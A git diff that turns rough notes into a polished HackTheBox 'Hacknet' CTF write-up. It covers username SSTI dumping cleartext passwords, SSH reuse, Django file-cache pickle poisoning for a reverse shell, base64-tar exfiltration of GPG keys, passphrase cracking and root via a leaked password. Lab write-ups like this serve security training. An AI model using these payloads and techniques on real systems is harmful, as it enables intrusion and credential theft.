@@ -2,6 +2,7 @@
 title: Hacknet
 author: Julien Bongars
 date: 2025-11
+link: [app.hackthebox.com/machines/Hacknet](https://app.hackthebox.com/machines/Hacknet)
 tags:
   - HackTheBox
   - Medium
@@ -9,42 +10,56 @@ tags:
   - Hacking
 ---
 
-ip = 10.129.232.4
+# Hacknet — Writeup
 
-hosts = hacknet.htb
+> Platform: HackTheBox · Difficulty: **Medium** · OS: **Linux**
+> Target: `10.129.232.4` (`hacknet.htb`)
 
-## website recon
+## Summary
 
-- login page with username and password
-- ability to upload file in profile page
-- there is a csrfmiddleware token that is injected in each request. This prevents CSRF attacks but only when registering it seems.
-- usernames appear to be stored in a database somewhere. Possible SQL injection?
+Hacknet is a **Medium** Linux box built around a Django social-network app. The app splits accounts into "main" users (searchable) and "hidden" users (IDs 25+, excluded from search with broken messaging), and a large amount of time can be lost probing SQLi, SSTI, upload RCE, CSRF, and path traversal that all lead nowhere.
 
-  - "search" page doesn't appear to be injectable... but it doesn't appear to cause a page error?
-  - request seem to return status 200 no matter the input
+The actual foothold is a **server-side template injection in the username field**: setting the username to `{{ users.values }}` renders the full user table — emails, usernames, and cleartext passwords — through the "likes" display. This leaks `deepdive` and, in turn, `backdoor_bandit` (`mikey`), whose password works over SSH despite the app's 2FA. That gives the user flag.
 
-- you can send messages?
+Privilege escalation chains three steps. First, `/var/www/HackNet/settings.py` leaks the MySQL creds for `sandy`, and the same file points at a **file-based Django cache** in a world-writable directory. Poisoning that cache with a malicious pickle yields RCE as **sandy** when the Explore page deserializes it. Second, sandy owns a directory of GPG-encrypted SQL backups; her private key is recovered from `~/.gnupg`, cracked with `gpg2john` + rockyou (`sweetheart`), and used to decrypt the backups. Finally, the decrypted backup logs contain a chat message where the **MySQL root password is shared in plaintext**, which is reused for root.
 
-  - something very weird... trying to create a new user, gave me "bad credentials". Then I could login but wwhen inside, can't find other users including original user...
-  - it appears that I can log into test@gmail and 123@gmail but I can't see the other user?
-  - editing profile doesn't appear to decode HTML encoding %2F
-  - I can see posts from other users but trying to post a comment leads to a 302 and renders html for the profile page but under the comment section?
-  -
+---
 
-- profile image can be updated as a gif?
--
+## Recon
 
-## Possible attack vectors
+### Website recon
 
-- image upload
-- registration page
-- comments on other people's accounts
+The app is a Django-based social network (jQuery/AJAX form handling) behind nginx. Initial surface:
 
-## Searching for paths?
+- Login page with username + password.
+- Profile page with a file upload.
+- A `csrfmiddlewaretoken` injected into each request — but it's only meaningfully validated on registration.
+- Usernames are stored in a backing database (initial SQLi suspicion).
 
+Behavioral notes gathered while poking the app:
+
+- The **search** page doesn't appear injectable and returns `200` regardless of input (no error-based signal).
+- Messaging is strange: creating a new user gave "bad credentials," then login worked but no other users (including the original) were visible.
+- Able to log into `test@gmail` and `123@gmail`, but other users weren't visible.
+- Editing the profile doesn't decode HTML-encoding (`%2F` stays literal).
+- Posts from other users are visible, but posting a comment returns a `302` and renders the profile-page HTML under the comment section.
+- Profile image can be updated (e.g. as a GIF).
+
+### Possible attack vectors (initial)
+
+- Image upload
+- Registration page
+- Comments on other people's accounts
+
+### Directory brute force
+
+```txt
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://hacknet.htb -c "csrftoken=0B2CZPErZ4ypt3xrB0mjFZWjA4JlpmNo; sessionid=jazlashdvvqmo3ofhfpqsnilfoazer3v" -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" -b "logout"
+```
 
-### By using the following request, I figured out I am userid = 27
+### Identifying own user ID
+
+The contacts endpoint reveals the current account is `userId=27`:
 
 ```txt
 GET /contacts?action=request&userId=27 HTTP/1.1
@@ -59,59 +74,64 @@ Cookie: csrftoken=anx3komXrXva92xRqdLt6FLa0EMLZtJT; sessionid=8zprwhphh6gelrzvfb
 Connection: keep-alive
 ```
 
-there are a few "hidden" users for 25,26...30?
+There are a few "hidden" users around IDs 25–30:
 
+```
 test@gmail.com = 27
-123@gmail.com = 30
+123@gmail.com  = 30
+```
 
-I know the user id is correct and I have accepted my alt account as a contact but I cannot send messages between accounts even if I force the API request.
+The user ID is confirmed correct and the alt account was accepted as a contact, but messages still can't be sent between accounts even by forcing the API request.
 
----
-
-## Additional Recon
+### Additional recon
 
 - nginx/1.22.1 (no known RCE vulns)
 - Django-based app (likely using Django templates)
 - AJAX handles form submissions (jQuery)
 
-## User Tiers
+### User tiers
 
-- "Main users" (IDs 1-24?): searchable, full functionality
-- "Hidden users" (IDs 25+): not in search results, messaging broken
-  - Search shows "page 1 no results" vs "no results found" for invalid users
-  - Friend requests work but messaging fails even when accepted
+- **"Main users"** (IDs 1–24?): searchable, full functionality.
+- **"Hidden users"** (IDs 25+): not in search results, messaging broken.
+  - Search shows "page 1 no results" vs "no results found" for invalid users.
+  - Friend requests work but messaging fails even when accepted.
 
-## Tested & Failed
+### Tested & failed
 
-- SQL injection on search (returns 200 regardless)
-- SSTI payloads ({{7*7}}, Django/Jinja2 variants) in comments/profile
-- Image upload RCE (validates blob, preserves filename in /media)
-- PHP shell upload (likely not PHP backend)
-- CSRF token bypass (tokens validated on registration only)
-- Path traversal in article parameter
-- Profile enumeration via /profile/1-10000 (found valid IDs)
-- Template injection in comments, description, username
-- Default credentials (no email addresses known for main users)
+- SQL injection on search (returns 200 regardless).
+- SSTI payloads (`{{7*7}}`, Django/Jinja2 variants) in comments/profile.
+- Image upload RCE (validates blob, preserves filename in `/media`).
+- PHP shell upload (likely not a PHP backend).
+- CSRF token bypass (tokens validated on registration only).
+- Path traversal in article parameter.
+- Profile enumeration via `/profile/1-10000` (found valid IDs).
+- Template injection in comments, description, username.
+- Default credentials (no email addresses known for main users).
 
-## Observations
+### Observations
 
-- /media preserves uploaded filenames
-- Comments POST returns 302 to /profile, response HTML prepended via AJAX
-- Login requires email but profiles show only username
-- No forgot/change password functionality
-- Main vs hidden user distinction appears intentional
+- `/media` preserves uploaded filenames.
+- Comments POST returns `302` to `/profile`, response HTML prepended via AJAX.
+- Login requires email but profiles show only username.
+- No forgot/change password functionality.
+- Main vs hidden user distinction appears intentional.
 
 ---
 
-## Looking up a walkthrough because out of my depth
+## Stage 1: SSTI in username → user data dump
 
-you can change the username of profile to the following and by manipulating the likes, it will reveal the details of users in the likes. Refer to the external walkthrough. We get username: deepdive
+> Note: this path was found with the help of an external walkthrough after
+> the manual SSTI attempts above came up empty. The working injection is the
+> username field, surfaced through the "likes" display rather than the fields
+> tested earlier.
+
+Setting the profile username to the following and then manipulating the likes reveals the details of users shown in the likes list:
 
 ```txt
 username={{users.values}}
 ```
 
-Looking for user emails with the domain of hacknet.htb, we can assume these are the admins of this website
+Filtering for emails on the `hacknet.htb` domain (the site's own admins), this dumps `deepdive`:
 
 ```txt
 ``{
@@ -130,32 +150,37 @@ Looking for user emails with the domain of hacknet.htb, we can assume these are 
 `
 ```
 
-We are able to log in as this user and we can see he has one friend being backdoor_bandit. From my understanding from the external walkthrough, this is the user we must target.
+Logging in as `deepdive` shows a single friend: `backdoor_bandit` — the next target.
 
----
-
-## Back on my own
-
-I was able to get backdoor_bandit credentials using the same method as above. I see the following:-
+Using the same technique, `backdoor_bandit`'s record is recovered:
 
 ```bash
 {"id": 18, "email": "mikey@hacknet.htb", "username": "backdoor_bandit", "password": "mYd4rks1dEisH3re", "picture": "18.jpg", "about": "Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.", "contact_requests": 0, "unread_messages": 0, "is_public": False, "is_hidden": False, "two_fa": True}
 ```
 
-2FA seems to be broken...
+---
 
-I was able to get an ssh session by the following
+## Stage 2: SSH as mikey (user flag)
+
+The account has `two_fa: True`, but 2FA isn't enforced on SSH, so the leaked password logs straight in:
 
 ```bash
 sshpass "mYd4rks1dEisH3re" ssh mikey@hacknet.htb
 ```
 
-the user flag is at `/home/mikey/user.txt`
+User flag:
 
-## Privilege Escalation
+```
+/home/mikey/user.txt
+```
 
-there is a mysql sock in /run/sqld/sqld.sock
-can search for open files using
+---
+
+## Stage 3: Django cache poisoning → shell as sandy
+
+### Enumerating local services and creds
+
+A MySQL socket exists at `/run/sqld/sqld.sock`. Useful enumeration:
 
 ```bash
 ps aux
@@ -166,7 +191,7 @@ lsof
 lsof -U
 ```
 
-going to /var/www/Hacknet/settings.py we get sandy's password + db password
+`/var/www/Hacknet/settings.py` leaks sandy's DB password:
 
 ```py
 DATABASES = {
@@ -181,7 +206,7 @@ DATABASES = {
 }
 ```
 
-connect to mysql
+Connect to MySQL:
 
 ```bash
 # with sock
@@ -191,7 +216,7 @@ mysql -u sandy -p'h@ckn3tDBpa$$' -S /run/mysqld/mysqld.sock hacknet
 mysql -u sandy -p'h@ckn3tDBpa$$' -h localhost -P 3306 hacknet
 ```
 
-we find an auth user?
+The Django `auth_user` table holds the admin's pbkdf2 hash:
 
 ```bash
 MariaDB [hacknet]> select * from auth_user
@@ -203,14 +228,14 @@ MariaDB [hacknet]> select * from auth_user
 +----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
 ```
 
-let this cook in hashcat
+Set hashcat on it:
 
 ```txt
 echo pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= > hash.txt
 hashcat -m 10000 hash.txt /usr/share/wordlists/rockyou.txt.gz
 ```
 
-list of users and their passwords
+The app's own user table dumps cleartext passwords for everyone:
 
 ```txt
 MariaDB [hacknet]> select email,username,password from SocialNetwork_socialuser;
@@ -242,22 +267,19 @@ MariaDB [hacknet]> select email,username,password from SocialNetwork_socialuser;
 | virus_viper@securemail.org   | virus_viper        | V!rusV!p3r2024   |
 | brute_force@ciphermail.com   | brute_force        | BrUt3F0rc3#      |
 | shadowwalker@hushmail.com    | shadowwalker       | Sh@dowW@lk2024   |
+| mikey@hacknet.htb            | backdoor_bandit    | mYd4rks1dEisH3re |
 | t@t.com                      | {{ users.values }} | t                |
 +------------------------------+--------------------+------------------+
 26 rows in set (0.000 sec)
 ```
 
-doesn't really show anything we don't know...
+This confirms known creds but doesn't add anything new — the DB isn't the escalation path.
 
----
+### Cache poisoning (the real path)
 
-## Looking at walkthrough because I am out of my depth (again)
+> Note: the cache-poisoning idea came from an external walkthrough.
 
-The secret is we have global write access to the django cache. We need to poison one of the shells to get a reverse shell
-
----
-
-under settings.py there is this section
+The key fact is **global write access to the Django cache**; poisoning a cached pickle yields a reverse shell. `settings.py` defines a file-based cache:
 
 ```python
 CACHES = {
@@ -270,27 +292,21 @@ CACHES = {
 }
 ```
 
-exploring the /var/tmp/django_cache folder
-
-it is empty
-
-greping for any mention of cache
+The cache directory `/var/tmp/django_cache` starts empty. Grep the app for where the cache is actually used:
 
 ```bash
 find /var/www/HackNet -type f -name '*.py' | grep -Hn 'cache'
 ```
 
-we find a ref to cache in the explore page
+This points at the Explore page. Workflow: visit the Explore page to generate the legitimate cache entry, start a listener, then overwrite the cache file with a malicious pickle.
 
-generate pickle by visiting the explore page
-
-open nc shell in attacker console
+Listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-generate poisoned pickle by executing python code
+Generate the poisoned pickle (arbitrary code runs on deserialization via `__reduce__`):
 
 ```python
 import pickle
@@ -314,7 +330,7 @@ with open(f'./poison.djcache', 'wb') as f:
     f.write(payload)
 ```
 
-move the poisoned pickle to the legitamate cache
+Move the poisoned pickle into place as the legitimate cache entry:
 
 ```bash
 mv poisoned.djcache 983289483298243.djcache
@@ -322,13 +338,15 @@ mv poisoned.djcache 983289483298243.djcache
 ln -s poisoned.djcache <pickle>.djcachr
 ```
 
-open incognito browser, login and browse to the same page. This will trigger the poisoned cache and open reverse shell.
+In a fresh incognito session, log in and browse to the same Explore page. This triggers deserialization of the poisoned cache and fires the reverse shell — landing as **sandy**.
 
-this will trigger shell. We now are logged in as `sandy`
+---
 
-we find a folder of backups in `/var/www/HackNet/backups` which are populated with gpg encrypted files by sandy. We need to find the keyring to crack this (playing around).
+## Stage 4: GPG backups → root
 
-This is the list gpg keys
+### Locating sandy's GPG key
+
+`/var/www/HackNet/backups` contains GPG-encrypted SQL backups owned by sandy. The private key is needed to decrypt them. GPG keyring locations:
 
 ```bash
 /home/sandy/.gnupg/pubring.kbx    # Public keys (newer format)
@@ -337,14 +355,14 @@ This is the list gpg keys
 /home/sandy/.gnupg/pubring.gpg    # Public keys (old format)
 ```
 
-We can also use the following to find keys:-
+Broader search for key material:
 
 ```bash
 find / -type f -name '*.gpg' 2>/dev/null
 find / -type f -name 'armored*' 2>/dev/null
 ```
 
-we find two files in `/home/sandy/.gnupg/private-keys-v1.d/` and we copy it to our target server using the following to transport files safely
+Two files are found in `/home/sandy/.gnupg/private-keys-v1.d/`. Transfer them off-host safely via base64'd tar:
 
 ```bash
 # on target
@@ -354,7 +372,7 @@ tar czf - ./ | base64
 echo "PASTE_STRING_HERE" | base64 -d | tar xzf -
 ```
 
-use john to crack the password
+### Cracking the key passphrase
 
 ```bash
 # Export the private key in a format John/Hashcat can crack
@@ -370,13 +388,13 @@ john sandy_gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
 hashcat -m 17010 sandy_gpg.hash /usr/share/wordlists/rockyou.txt
 ```
 
-We get the password for sandy `sweetheart`
+The passphrase cracks to `sweetheart`:
 
 ```bash
 Sandy:sweetheart:::Sandy (My key for backups) <sandy@hacknet.htb>::armored_key.asc
 ```
 
-root password appears in the logs
+### Decrypting the backups → root password
 
 ```bash
 gpg --decrypt /var/www/HackNet/backups/backup01.sql.gpg > /var/www/HackNet/backups/backup01.sql
@@ -387,7 +405,7 @@ gpg --decrypt /var/www/HackNet/backups/backup03.sql.gpg > /var/www/HackNet/backu
 # (password we cracked earlier from armored_key.asc
 ```
 
-logs:-
+The decrypted SQL contains a chat log where the MySQL root password is shared in plaintext:
 
 ```logs
 sandy@hacknet:/var/www/HackNet/backups$ cat *.sql | grep password
@@ -406,12 +424,54 @@ sandy@hacknet:/var/www/HackNet/backups$ cat *.sql | grep password
   `password` varchar(128) NOT NULL,
 ```
 
-root password is h4ck3rs4re3veRywh3re99
+Root password: `h4ck3rs4re3veRywh3re99`. Reuse it for root.
 
 ---
 
-user flag
-e32ca68fa7586d101da414ff7089871b
+## Credentials
 
-root flag
-087a81fc86d8fc37500d97abd1627537
+| Where                            | Credential                                                |
+| -------------------------------- | --------------------------------------------------------- |
+| SSTI dump (`deepdive`)           | `deepdive@hacknet.htb` / `D33pD!v3r`                      |
+| SSTI dump (`backdoor_bandit`)    | `mikey@hacknet.htb` / `mYd4rks1dEisH3re` → SSH as `mikey` |
+| `settings.py` (Django DB)        | `sandy` / `h@ckn3tDBpa$$` (MySQL)                         |
+| sandy GPG private key passphrase | `sweetheart`                                              |
+| Decrypted backup chat log        | MySQL root / `h4ck3rs4re3veRywh3re99` → root              |
+
+---
+
+## Key lessons
+
+- **Timebox the obvious web bugs.** SQLi, SSTI on the tested fields, upload RCE, CSRF, and path traversal were all dead ends; the real SSTI lived in a field (username) surfaced through an unexpected sink (likes). When the common payloads all return clean, the vuln is often in _where_ output is rendered, not the input you first tried.
+- **A "200 no matter what" response is a signal, not a wall.** The search page swallowing all input meant it wasn't the injection point — worth moving on from faster.
+- **2FA in the DB ≠ 2FA on SSH.** `two_fa: True` on the app account didn't stop password auth over SSH. Always test recovered creds against every exposed service, not just the app they came from.
+- **Read `settings.py` early on any Django box.** It handed over DB creds _and_ the cache backend/location that became the escalation path.
+- **File-based Django cache + world-writable dir = pickle RCE.** `FileBasedCache` deserializes with pickle; write access to `LOCATION` means arbitrary code execution on the next cache read.
+- **base64'd tar is a reliable exfil for key material** when you only have a shell: `tar czf - ./ | base64` out, `base64 -d | tar xzf -` back.
+- **Secrets hide in backups.** The root password wasn't in any config — it was a throwaway line in a chat log inside an encrypted SQL dump. Decrypt and `grep` everything.
+
+### What went right
+
+- Web enumeration, user-tier discovery, and self-ID via the contacts endpoint were done independently before consulting anything external.
+- Recovered `backdoor_bandit` and cracked the escalation chain (DB creds → MySQL → GPG key → backups) largely without help, using the walkthrough only for the two conceptual leaps (the `{{ users.values }}` sink and the cache-poisoning idea).
+- Kept the exploit modular — confirmed each credential/shell before moving to the next hop.
+
+---
+
+## Tools & cheat sheet
+
+| Tool                        | Purpose in this box                             | Key command                                                           |
+| --------------------------- | ----------------------------------------------- | --------------------------------------------------------------------- |
+| `gobuster`                  | Directory brute force (authenticated)           | `gobuster dir -w <wl> -u http://hacknet.htb -c "<cookies>" -b logout` |
+| Burp / raw HTTP             | Enumerate contacts endpoint, confirm own userId | `GET /contacts?action=request&userId=27`                              |
+| SSTI (`{{ users.values }}`) | Dump user table via username → likes sink       | set profile `username={{users.values}}`                               |
+| `sshpass`                   | SSH with recovered password                     | `sshpass "mYd4rks1dEisH3re" ssh mikey@hacknet.htb`                    |
+| `lsof` / `netstat` / `ps`   | Local service + socket enumeration              | `lsof -U`, `netstat -tunlp`, `ps aux`                                 |
+| `mysql`                     | Read Django DB via leaked sandy creds           | `mysql -u sandy -p'h@ckn3tDBpa$$' -S /run/mysqld/mysqld.sock hacknet` |
+| `hashcat`                   | Crack Django pbkdf2 admin hash                  | `hashcat -m 10000 hash.txt rockyou.txt.gz`                            |
+| Python `pickle`             | Build poisoned Django cache entry               | `pickle.dumps(RCE())` with `__reduce__` → `os.system`                 |
+| `nc`                        | Catch reverse shell from cache trigger          | `nc -lvnp 4444`                                                       |
+| `tar` + `base64`            | Exfil GPG private keys over a shell             | `tar czf - ./ \| base64` / `base64 -d \| tar xzf -`                   |
+| `gpg2john` + `john`         | Crack GPG key passphrase (`sweetheart`)         | `gpg2john *.key > h; john h --wordlist=rockyou.txt`                   |
+| `gpg`                       | Decrypt SQL backups                             | `gpg --decrypt backup01.sql.gpg > backup01.sql`                       |
+| `grep`                      | Find root password in decrypted backups         | `cat *.sql \| grep password`                                          |
